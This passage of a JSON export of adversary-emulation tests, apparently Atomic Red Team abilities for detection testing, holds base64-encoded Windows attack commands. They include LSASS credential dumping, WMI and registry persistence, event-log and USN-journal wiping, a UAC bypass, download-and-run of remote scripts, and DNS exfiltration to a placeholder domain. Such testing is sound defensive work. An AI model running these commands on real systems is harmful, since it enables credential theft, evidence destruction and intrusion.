[], "executor": "psh", "access": {}, "description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DNS queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DNS queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout.\n", "variations": []}, {"test": "QzpcV2luZG93c1xUZW1wXHhvcmR1bXAuZXhlIC1vdXQgQzpcV2luZG93c1xUZW1wXGxzYXNzLXhvcmR1bXAudDEwMDMuMDAxLmRtcCAteCAweDQx", "ability_id": "4497e74ad70df1a721117e28ee167174", "technique_name": "OS Credential Dumping: LSASS Memory", "additional_info": {}, "privilege": "", "technique_id": "T1003.001", "platform": "windows", "name": "Dump LSASS.exe using imported Microsoft DLLs", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gQzpcV2luZG93c1xUZW1wXGxzYXNzLXhvcmR1bXAudDEwMDMuMDAxLmRtcCAtRXJyb3JBY3Rpb24gSWdub3Jl"], "executor": "psh", "access": {}, "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved by\nimporting built-in DLLs and calling exported functions. Xordump will re-read the resulting minidump \nfile and delete it immediately to avoid brittle EDR detections that signature lsass minidump files.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-xordump.t1003.001.dmp.\n", "variations": []}, {"test": "bmV0IGFjY291bnRz", "ability_id": "57296a2ddbeb7423c05feef2fe972111", "technique_name": "Password Policy Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1201", "platform": "windows", "name": "Examine local password policy - Windows", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Lists the local password policy to console on Windows.\n", "variations": []}, {"test": "JEZpbHRlckFyZ3MgPSBAe25hbWU9J0F0b21pY1JlZFRlYW0tV01JUGVyc2lzdGVuY2UtRXhhbXBsZSc7OyAgICAgICAgICAgICAgICAgRXZlbnROYW1lU3BhY2U9J3Jvb3RcQ2ltVjInOzsgICAgICAgICAgICAgICAgIFF1ZXJ5TGFuZ3VhZ2U9IldRTCI7OyAgICAgICAgICAgICAgICAgUXVlcnk9IlNFTEVDVCAqIEZST00gX19JbnN0YW5jZU1vZGlmaWNhdGlvbkV2ZW50IFdJVEhJTiA2MCBXSEVSRSBUYXJnZXRJbnN0YW5jZSBJU0EgJ1dpbjMyX1BlcmZGb3JtYXR0ZWREYXRhX1BlcmZPU19TeXN0ZW0nIEFORCBUYXJnZXRJbnN0YW5jZS5TeXN0ZW1VcFRpbWUgPj0gMjQwIEFORCBUYXJnZXRJbnN0YW5jZS5TeXN0ZW1VcFRpbWUgPCAzMjUifTs7ICRGaWx0ZXI9TmV3LUNpbUluc3RhbmNlIC1OYW1lc3BhY2Ugcm9vdC9zdWJzY3JpcHRpb24gLUNsYXNzTmFtZSBfX0V2ZW50RmlsdGVyIC1Qcm9wZXJ0eSAkRmlsdGVyQXJnczsgOyAkQ29uc3VtZXJBcmdzID0gQHtuYW1lPSdBdG9taWNSZWRUZWFtLVdNSVBlcnNpc3RlbmNlLUV4YW1wbGUnOzsgICAgICAgICAgICAgICAgIENvbW1hbmRMaW5lVGVtcGxhdGU9IiQoJEVudjpTeXN0ZW1Sb290KVxTeXN0ZW0zMlxub3RlcGFkLmV4ZSI7fTsgJENvbnN1bWVyPU5ldy1DaW1JbnN0YW5jZSAtTmFtZXNwYWNlIHJvb3Qvc3Vic2NyaXB0aW9uIC1DbGFzc05hbWUgQ29tbWFuZExpbmVFdmVudENvbnN1bWVyIC1Qcm9wZXJ0eSAkQ29uc3VtZXJBcmdzOyA7ICRGaWx0ZXJUb0NvbnN1bWVyQXJncyA9IEB7OyBGaWx0ZXIgPSBbUmVmXSAkRmlsdGVyOzsgQ29uc3VtZXIgPSBbUmVmXSAkQ29uc3VtZXI7OyB9OyAkRmlsdGVyVG9Db25zdW1lckJpbmRpbmcgPSBOZXctQ2ltSW5zdGFuY2UgLU5hbWVzcGFjZSByb290L3N1YnNjcmlwdGlvbiAtQ2xhc3NOYW1lIF9fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcgLVByb3BlcnR5ICRGaWx0ZXJUb0NvbnN1bWVyQXJncw==", "ability_id": "e1958fe8790228a5d27d9b52bc8c01a2", "technique_name": "Event Triggered Execution: Windows Management Instrumentation Event Subscription", "additional_info": {}, "privilege": "", "technique_id": "T1546.003", "platform": "windows", "name": "Persistence via WMI Event Subscription", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["JEV2ZW50Q29uc3VtZXJUb0NsZWFudXAgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdC9zdWJzY3JpcHRpb24gLUNsYXNzIENvbW1hbmRMaW5lRXZlbnRDb25zdW1lciAtRmlsdGVyICJOYW1lID0gJ0F0b21pY1JlZFRlYW0tV01JUGVyc2lzdGVuY2UtRXhhbXBsZSciOyAkRXZlbnRGaWx0ZXJUb0NsZWFudXAgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdC9zdWJzY3JpcHRpb24gLUNsYXNzIF9fRXZlbnRGaWx0ZXIgLUZpbHRlciAiTmFtZSA9ICdBdG9taWNSZWRUZWFtLVdNSVBlcnNpc3RlbmNlLUV4YW1wbGUnIjsgJEZpbHRlckNvbnN1bWVyQmluZGluZ1RvQ2xlYW51cCA9IEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290L3N1YnNjcmlwdGlvbiAtUXVlcnkgIlJFRkVSRU5DRVMgT0YgeyQoJEV2ZW50Q29uc3VtZXJUb0NsZWFudXAuX19SRUxQQVRIKX0gV0hFUkUgUmVzdWx0Q2xhc3MgPSBfX0ZpbHRlclRvQ29uc3VtZXJCaW5kaW5nIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZTsgJEZpbHRlckNvbnN1bWVyQmluZGluZ1RvQ2xlYW51cCB8IFJlbW92ZS1XbWlPYmplY3Q7ICRFdmVudENvbnN1bWVyVG9DbGVhbnVwIHwgUmVtb3ZlLVdtaU9iamVjdDsgJEV2ZW50RmlsdGVyVG9DbGVhbnVwIHwgUmVtb3ZlLVdtaU9iamVjdA=="], "executor": "psh", "access": {}, "description": "Run from an administrator powershell window. After running, reboot the victim machine.\nAfter it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af\n\nhttps://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545\n", "variations": []}, {"test": "JGxvZ3MgPSBHZXQtRXZlbnRMb2cgLUxpc3QgfCBGb3JFYWNoLU9iamVjdCB7JF8uTG9nfTsgJGxvZ3MgfCBGb3JFYWNoLU9iamVjdCB7Q2xlYXItRXZlbnRMb2cgLUxvZ05hbWUgJF8gfTsgR2V0LUV2ZW50TG9nIC1saXN0", "ability_id": "6fa417fb183d6c20a67e617c0249f04f", "technique_name": "Indicator Removal on Host: Clear Windows Event Logs", "additional_info": {}, "privilege": "", "technique_id": "T1070.001", "platform": "windows", "name": "Delete System Logs Using Clear-EventLog", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Clear event logs using built-in PowerShell commands.\nUpon successful execution, you should see the list of deleted event logs\nUpon execution, open the Security.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty or has very few logs in it.\n", "variations": []}, {"test": "R2V0LVByb2Nlc3M=", "ability_id": "1d48fc4147a7bcd47bdf60db7dde9640", "technique_name": "Process Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1057", "platform": "windows", "name": "Process Discovery - Get-Process", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Utilize Get-Process PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute Get-Process to list processes. Output will be via stdout. \n", "variations": []}, {"test": "IiV0ZW1wJVx1YWNtZVw1NiBBa2FnaTY0LmV4ZSI=", "ability_id": "1ce648533bf5ede07e4d75a4b9e14979", "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "additional_info": {}, "privilege": "", "technique_id": "T1548.002", "platform": "windows", "name": "UACME Bypass Method 56", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cG93ZXJzaGVsbCBTdG9wLVByb2Nlc3MgLU5hbWUgY21kIC1Gb3JjZSAtRXJyb3JBY3Rpb24gSWdub3JlICYmIHBvd2Vyc2hlbGwgU3RvcC1Qcm9jZXNzIC1OYW1lIG1tYyAtRm9yY2UgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "cmd", "access": {}, "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Hashim Jawad\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\WSReset.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodShellWSReset\n\nhttps://github.com/hfiref0x/UACME\n", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChpd3IgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vbWFzdGVyL2F0b21pY3MvVDEyMDQuMDAyL3NyYy9JbnZva2UtTWFsRG9jLnBzMSIgLVVzZUJhc2ljUGFyc2luZyk7ICRtYWNyb2NvZGUgPSAiICAgT3BlbiBgIkM6XFVzZXJzXFB1YmxpY1xhcnQuanNlYCIgRm9yIE91dHB1dCBBcyAjMWBuICAgV3JpdGUgIzEsIGAiV1NjcmlwdC5RdWl0YCJgbiAgIENsb3NlICMxYG4gICBTaGVsbGAkIGAiY3NjcmlwdC5leGUgQzpcVXNlcnNcUHVibGljXGFydC5qc2VgImBuIjsgSW52b2tlLU1hbERvYyAtbWFjcm9Db2RlICRtYWNyb2NvZGUgLW9mZmljZVByb2R1Y3QgIldvcmQi", "ability_id": "a40a2e93cc2a0413982801a9323baad9", "technique_name": "User Execution: Malicious File", "additional_info": {}, "privilege": "", "technique_id": "T1204.002", "platform": "windows", "name": "OSTap Style Macro Execution", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gQzpcVXNlcnNcUHVibGljXGFydC5qc2UgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "psh", "access": {}, "description": "This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nThis is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns.\nReferences:\n  https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader\n", "variations": []}, {"test": "JE1hbnVmYWN0dXJlciA9IEdldC1XbWlPYmplY3QgLUNsYXNzIFdpbjMyX0NvbXB1dGVyU3lzdGVtIHwgc2VsZWN0LW9iamVjdCAtZXhwYW5kcHJvcGVydHkgIk1hbnVmYWN0dXJlciI7ICRNb2RlbCA9IEdldC1XbWlPYmplY3QgLUNsYXNzIFdpbjMyX0NvbXB1dGVyU3lzdGVtIHwgc2VsZWN0LW9iamVjdCAtZXhwYW5kcHJvcGVydHkgIk1vZGVsIjsgaWYoKCgkTWFudWZhY3R1cmVyLlRvTG93ZXIoKSAtZXEgIm1pY3Jvc29mdCBjb3Jwb3JhdGlvbiIpIC1hbmQgKCRNb2RlbC5Ub0xvd2VyKCkuY29udGFpbnMoInZpcnR1YWwiKSkpIC1vciAoJE1hbnVmYWN0dXJlci5Ub0xvd2VyKCkuY29udGFpbnMoInZtd2FyZSIpKSAtb3IgKCRNb2RlbC5Ub0xvd2VyKCkgLWVxICJ2aXJ0dWFsYm94IikpIHt3cml0ZS1ob3N0ICJWaXJ0dWFsaXphdGlvbiBlbnZpcm9ubWVudCBkZXRlY3RlZCEifSBlbHNlIHt3cml0ZS1ob3N0ICJObyB2aXJ0dWFsaXphdGlvbiBlbnZpcm9ubWVudCBkZXRlY3RlZCEifQ==", "ability_id": "64ccf7cd4358a0540ab51c8015c1b744", "technique_name": "Virtualization/Sandbox Evasion: System Checks", "additional_info": {}, "privilege": "", "technique_id": "T1497.001", "platform": "windows", "name": "Detect Virtualization Environment via WMI Manufacturer/Model Listing (Windows)", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Windows Management Instrumentation(WMI) objects contain system information which helps to detect virtualization. This test will get the model and manufacturer of the machine to determine if it is a virtual machine, such as through VMware or VirtualBox. \n", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChJV1IgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9CQy1TRUNVUklUWS9FbXBpcmUvZjZlZmQ1YTk2M2Q0MjRhMWY5ODNkODg0YjYzN2RhODY4ZTVkZjQ2Ni9kYXRhL21vZHVsZV9zb3VyY2UvcHJpdmVzYy9HZXQtU3lzdGVtLnBzMScgLVVzZUJhc2ljUGFyc2luZyk7IEdldC1TeXN0ZW0gLVRlY2huaXF1ZSBUb2tlbiAtVmVyYm9zZQ==", "ability_id": "ae73a53476995f46b71f11709f525319", "technique_name": "Access Token Manipulation: Token Impersonation/Theft", "additional_info": {}, "privilege": "", "technique_id": "T1134.001", "platform": "windows", "name": "`SeDebugPrivilege` token duplication", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).", "variations": []}, {"test": "IiVQUk9HUkFNRklMRVMoeDg2KSUvUmFkbWluIFZpZXdlciAzL1JhZG1pbi5leGUi", "ability_id": "f9cdee5ce418848bdbc268bdfd925f66", "technique_name": "Software Deployment Tools", "additional_info": {}, "privilege": "", "technique_id": "T1072", "platform": "windows", "name": "Radmin Viewer Utility", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "An adversary may use Radmin Viewer Utility to remotely control Windows device, this will start the radmin console.\n", "variations": []}, {"test": "ZnN1dGlsIHVzbiBkZWxldGVqb3VybmFsIC9EIEM6", "ability_id": "9d2e91b9241ae43b517be2be98bddfd9", "technique_name": "Indicator Removal on Host", "additional_info": {}, "privilege": "", "technique_id": "T1070", "platform": "windows", "name": "Indicator Removal using FSUtil", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZnN1dGlsIHVzbiBjcmVhdGVqb3VybmFsIG09MTAwMCBhPTEwMCBjOg=="], "executor": "cmd", "access": {}, "description": "Manages the update sequence number (USN) change journal, which provides a persistent log of all changes made to files on the volume. Upon execution, no output\nwill be displayed. More information about fsutil can be found at https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn\n", "variations": []}, {"test": "ZmluZHN0ciAvc2kgcGFzcyAqLnhtbCAqLmRvYyAqLnR4dCAqLnhsczsgbHMgLVIgfCBzZWxlY3Qtc3RyaW5nIC1QYXR0ZXJuIHBhc3N3b3Jk", "ability_id": "0b63be39e2e9969dd4435ce3575938c3", "technique_name": "Unsecured Credentials: Credentials In Files", "additional_info": {}, "privilege": "", "technique_id": "T1552.001", "platform": "windows", "name": "Extracting passwords with findstr", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Extracting Credentials from Files. Upon execution, the contents of files that contain the word \"password\" will be displayed.\n", "variations": []}, {"test": "R2V0LVByb2Nlc3M=", "ability_id": "5a39d7ed-45c9-4a79-b581-e5fb99e24f65", "technique_name": "Process Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1057", "platform": "windows", "name": "System processes", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Identify system processes", "variations": []}, {"test": "cmVnIGFkZCBIS0VZX0xPQ0FMX01BQ0hJTkVcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIC90IFJFR19FWFBBTkRfU1ogL3YgU2VjdXJpdHlIZWFsdGggL2QgY2FsYy5leGUgL2Y=", "ability_id": "f149aa6145b4f0d5b86519c7cac66893", "technique_name": "Modify Registry", "additional_info": {}, "privilege": "", "technique_id": "T1112", "platform": "windows", "name": "Modify Registry of Local Machine - cmd", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVnIGRlbGV0ZSBIS0VZX0xPQ0FMX01BQ0hJTkVcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIC92IFNlY3VyaXR5SGVhbHRoIC9mID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Modify the Local Machine registry RUN key to change Windows Defender executable that should be ran on startup.  This should only be possible when\nCMD is ran as Administrative rights. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the modified entry in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.\n", "variations": []}, {"test": "NjRjNGFlX3Fha2JvdC5iYXQ=", "ability_id": "2b4e2a7be6ebda89812fe2d2f39f6173", "technique_name": "System Network Configuration Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1016", "platform": "windows", "name": "Qakbot Recon", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["64c4ae_qakbot.bat"], "cleanup": [], "executor": "cmd", "access": {}, "description": "A list of commands known to be performed by Qakbot for recon purposes", "variations": []}, {"test": "cHlweWthdHogbGl2ZSBsc2E=", "ability_id": "03526668cc55b6544244b107feadaf22", "technique_name": "OS Credential Dumping: LSASS Memory", "additional_info": {}, "privilege": "", "technique_id": "T1003.001", "platform": "windows", "name": "LSASS read with pypykatz", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::\n\nPython 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.\n\nSuccessful execution of this test will display multiple useranames and passwords/hashes to the screen.\n", "variations": []}, {"test": "aGguZXhlIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vbWFzdGVyL2F0b21pY3MvVDEyMTguMDAxL3NyYy9UMTIxOC4wMDEuY2ht", "ability_id": "c8f5864f2143390d743e4bf99a39930c", "technique_name": "Signed Binary Proxy Execution: Compiled HTML File", "additional_info": {}, "privilege": "", "technique_id": "T1218.001", "platform": "windows", "name": "Compiled HTML Help Remote Payload", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Uses hh.exe to execute a remote compiled HTML Help payload.\nUpon execution displays an error saying the file cannot be open\n", "variations": []}, {"test": "cmVnIGFkZCAiaGtsbVxzeXN0ZW1cY3VycmVudGNvbnRyb2xzZXRcY29udHJvbFxwcmludFxtb25pdG9yc1xBUlQiIC92ICJBdG9taWMgUmVkIFRlYW0iIC9kICJDOlxQYXRoXEF0b21pY1JlZFRlYW0uZGxsIiAvdCBSRUdfU1o=", "ability_id": "4593d72a5145e3f494421ac772d37464", "technique_name": "Boot or Logon Autostart Execution: Port Monitors", "additional_info": {}, "privilege": "", "technique_id": "T1547.010", "platform": "windows", "name": "Add Port Monitor persistence in Registry", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVnIGRlbGV0ZSAiaGtsbVxzeXN0ZW1cY3VycmVudGNvbnRyb2xzZXRcY29udHJvbFxwcmludFxtb25pdG9yc1xBUlQiIC9mID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Add key-value pair to a Windows Port Monitor registry. On the subsequent reboot dll will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.", "variations": []}, {"test": "Y29weSBDOlxXaW5kb3dzXFN5c3RlbTMyXGNhbGMuZXhlICV0ZW1wJVxUMTAzNi4wMDNfbWFzcXVlcmFkaW5nLmRvY3guZXhlIC9ZICYmIGNvcHkgQzpcV2luZG93c1xTeXN0ZW0zMlxjYWxjLmV4ZSAldGVtcCVcVDEwMzYuMDAzX21hc3F1ZXJhZGluZy5wZGYuZXhlIC9ZICYmIGNvcHkgQzpcV2luZG93c1xTeXN0ZW0zMlxjYWxjLmV4ZSAldGVtcCVcVDEwMzYuMDAzX21hc3F1ZXJhZGluZy5wczEuZXhlIC9ZICYmIGNvcHkgNGJkMTQ1X1QxMDM2LjAwM19tYXNxdWVyYWRpbmcudmJzICV0ZW1wJVxUMTAzNi4wMDNfbWFzcXVlcmFkaW5nLnhscy52YnMgL1kgJiYgY29weSA0YmQxNDVfVDEwMzYuMDAzX21hc3F1ZXJhZGluZy52YnMgJXRlbXAlXFQxMDM2LjAwM19tYXNxdWVyYWRpbmcueGxzeC52YnMgL1kgJiYgY29weSA0YmQxNDVfVDEwMzYuMDAzX21hc3F1ZXJhZGluZy52YnMgJXRlbXAlXFQxMDM2LjAwM19tYXNxdWVyYWRpbmcucG5nLnZicyAvWSAmJiBjb3B5IDEwNzQxN19UMTAzNi4wMDNfbWFzcXVlcmFkaW5nLnBzMSAldGVtcCVcVDEwMzYuMDAzX21hc3F1ZXJhZGluZy5kb2MucHMxIC9ZICYmIGNvcHkgMTA3NDE3X1QxMDM2LjAwM19tYXNxdWVyYWRpbmcucHMxICV0ZW1wJVxUMTAzNi4wMDNfbWFzcXVlcmFkaW5nLnBkZi5wczEgL1kgJiYgY29weSAxMDc0MTdfVDEwMzYuMDAzX21hc3F1ZXJhZGluZy5wczEgJXRlbXAlXFQxMDM2LjAwM19tYXNxdWVyYWRpbmcucnRmLnBzMSAvWSAmJiAldGVtcCVcVDEwMzYuMDAzX21hc3F1ZXJhZGluZy5kb2N4LmV4ZSAmJiAldGVtcCVcVDEwMzYuMDAzX21hc3F1ZXJhZGluZy5wZGYuZXhlICYmICV0ZW1wJVxUMTAzNi4wMDNfbWFzcXVlcmFkaW5nLnBzMS5leGUgJiYgJXRlbXAlXFQxMDM2LjAwM19tYXNxdWVyYWRpbmcueGxzLnZicyAmJiAldGVtcCVcVDEwMzYuMDAzX21hc3F1ZXJhZGluZy54bHN4LnZicyAmJiAldGVtcCVcVDEwMzYuMDAzX21hc3F1ZXJhZGluZy5wbmcudmJzICYmIEM6XFdpbmRvd3NcU3lzdGVtMzJcV2luZG93c1Bvd2VyU2hlbGxcdjEuMFxwb3dlcnNoZWxsLmV4ZSAtRmlsZSAldGVtcCVcVDEwMzYuMDAzX21hc3F1ZXJhZGluZy5kb2MucHMxICYmIEM6XFdpbmRvd3NcU3lzdGVtMzJcV2luZG93c1Bvd2VyU2hlbGxcdjEuMFxwb3dlcnNoZWxsLmV4ZSAtRmlsZSAldGVtcCVcVDEwMzYuMDAzX21hc3F1ZXJhZGluZy5wZGYucHMxICYmIEM6XFdpbmRvd3NcU3lzdGVtMzJcV2luZG93c1Bvd2VyU2hlbGxcdjEuMFxwb3dlcnNoZWxsLmV4ZSAtRmlsZSAldGVtcCVcVDEwMzYuMDAzX21hc3F1ZXJhZGluZy5ydGYucHMx", "ability_id": "d590723bb9bb8f72b075f9717adb0d98", "technique_name": "Masquerading: Rename System Utilities", "additional_info": {}, "privilege": "", "technique_id": "T1036.003", "platform": "windows", "name": "File Extension Masquerading", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["4bd145_T1036.003_masquerading.vbs", "107417_T1036.003_masquerading.ps1"], "cleanup": ["ZGVsIC9mICV0ZW1wJVxUMTAzNi4wMDNfbWFzcXVlcmFkaW5nLmRvY3guZXhlID4gbnVsIDI+JjEgJiYgZGVsIC9mICV0ZW1wJVxUMTAzNi4wMDNfbWFzcXVlcmFkaW5nLnBkZi5leGUgPiBudWwgMj4mMSAmJiBkZWwgL2YgJXRlbXAlXFQxMDM2LjAwM19tYXNxdWVyYWRpbmcucHMxLmV4ZSA+IG51bCAyPiYxICYmIGRlbCAvZiAldGVtcCVcVDEwMzYuMDAzX21hc3F1ZXJhZGluZy54bHMudmJzID4gbnVsIDI+JjEgJiYgZGVsIC9mICV0ZW1wJVxUMTAzNi4wMDNfbWFzcXVlcmFkaW5nLnhsc3gudmJzID4gbnVsIDI+JjEgJiYgZGVsIC9mICV0ZW1wJVxUMTAzNi4wMDNfbWFzcXVlcmFkaW5nLnBuZy52YnMgPiBudWwgMj4mMSAmJiBkZWwgL2YgJXRlbXAlXFQxMDM2LjAwM19tYXNxdWVyYWRpbmcuZG9jLnBzMSA+IG51bCAyPiYxICYmIGRlbCAvZiAldGVtcCVcVDEwMzYuMDAzX21hc3F1ZXJhZGluZy5wZGYucHMxID4gbnVsIDI+JjEgJiYgZGVsIC9mICV0ZW1wJVxUMTAzNi4wMDNfbWFzcXVlcmFkaW5nLnJ0Zi5wczEgPiBudWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "download and execute a file masquerading as images or Office files. Upon execution 3 calc instances and 3 vbs windows will be launched.\n\ne.g SOME_LEGIT_NAME.[doc,docx,xls,xlsx,pdf,rtf,png,jpg,etc.].[exe,vbs,js,ps1,etc] (Quartelyreport.docx.exe)\n", "variations": []}, {"test": "SW1wb3J0LU1vZHVsZSAkZW52OlRlbXBcZG5zZXhmaWwucHMxOyBJbnZva2UtRE5TRXhmaWx0cmF0b3IgLWkgJGVudjpUZW1wXGRuc2V4ZmlsLnBzMSAtZCB0YXJnZXQuZXhhbXBsZS5jb20gLXAgYXRvbWljIC1kb2ggZ29vZ2xlIC10IDUwMCBOb25l", "ability_id": "02d329a96170c3d4e3fdb7ba516fb478", "technique_name": "Exfiltration Over Alternative Protocol", "additional_info": {}, "privilege": "", "technique_id": "T1048", "platform": "windows", "name": "DNSExfiltration (doh)", "requirements": [], "tactic": "exfiltration", "buckets": ["exfiltration"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "DNSExfiltrator allows for transfering (exfiltrate) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.\n!!! Test will fail without a domain under your control with A record and NS record !!! \nSee this github page for more details - https://github.com/Arno0x/DNSExfiltrator\n", "variations": []}, {"test": "QzpcV2luZG93c1xTeXN0ZW0zMlxDdXJsLmV4ZSAtcyAtQSAiSHR0cEJyb3dzZXIvMS4wIiAtbTMgd3d3Lmdvb2dsZS5jb20gPm51bCAyPiYxICYmIEM6XFdpbmRvd3NcU3lzdGVtMzJcQ3VybC5leGUgLXMgLUEgIldnZXQvMS45K2N2cy1zdGFibGUgKFJlZCBIYXQgbW9kaWZpZWQpIiAtbTMgd3d3Lmdvb2dsZS5jb20gPm51bCAyPiYxICYmIEM6XFdpbmRvd3NcU3lzdGVtMzJcQ3VybC5leGUgLXMgLUEgIk9wZXJhLzguODEgKFdpbmRvd3MgTlQgNi4wOyBVOyBlbikiIC1tMyB3d3cuZ29vZ2xlLmNvbSA+bnVsIDI+JjEgJiYgQzpcV2luZG93c1xTeXN0ZW0zMlxDdXJsLmV4ZSAtcyAtQSAiKjx8PioiIC1tMyB3d3cuZ29vZ2xlLmNvbSA+bnVsIDI+JjE=", "ability_id": "24c3b7b004401d839a5c337201da3484", "technique_name": "Application Layer Protocol: Web Protocols", "additional_info": {}, "privilege": "", "technique_id": "T1071.001", "platform": "windows", "name": "Malicious User Agents - CMD", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "This test simulates 